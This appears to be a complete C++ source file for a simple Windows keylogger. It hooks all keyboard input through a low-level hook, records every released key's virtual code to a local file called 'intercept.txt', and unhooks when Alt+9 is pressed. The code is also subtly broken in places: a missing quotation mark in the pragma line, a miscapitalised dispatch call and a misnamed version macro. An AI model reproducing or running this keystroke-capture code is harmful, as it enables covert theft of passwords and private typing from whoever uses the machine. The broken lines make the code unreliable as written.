#define WIN32_WINNT 0x500  //minimum Windows version required 
#include <windows.h>		//Windows API functions
#include <fstream>			//file stream functions for file operations.
#pragma comment(lib,user32.lib")		
using namespace  std;  

ofstream out("intercept.txt", ios::out);		//opens intercept.txt file

LRESULT CALLBACK ProcessKB(int ncode, WPARAM event, LPARAM kb)		//function processing keyboard events
	{	
		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)kb;	//pointer
		if (event==WM_KEYUP) 	//check if event is a key release
			out << (char)p->vkCode;		//writes the virtual key code of released key
		return CallNextHookEx(NULL, ncode, event, kb);	//passes event to tthe next hook in chain
	}
	
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPreviousInstance, LPSTR lpCmdLine, int nShowCmd)
	{	MSG msg;		//declares message structure
		out << "Intercepted keyboard:\n\n";		//writes the header
		HHOOK captest=SetWindowsHookEx(WH_KEYBOARD_LL, ProcessKB, hInstance, 0);	//low-level keyboard hook using the ProcessKB
		
		RegisterHotKey(NULL,1,MOD_ALT,0x39);		//registers alt+9 to stop keylogging
		while (GetMessage(&msg,NULL,0,0)!=0)
		{	if	(msg.message == WM_HOTKEY)		//checks if hotkey was pressed
			{	UnhookWindowsHookEx(captest);		//unhooks keyboard hook
				out << "\n\nEnd Intercept\n";
				out.close();
				return(0);
			}
			TranslateMessage(&msg);
			dispatchMessage(&msg);			//Dispatches a message to a window procedure.
			
		}
	}
	
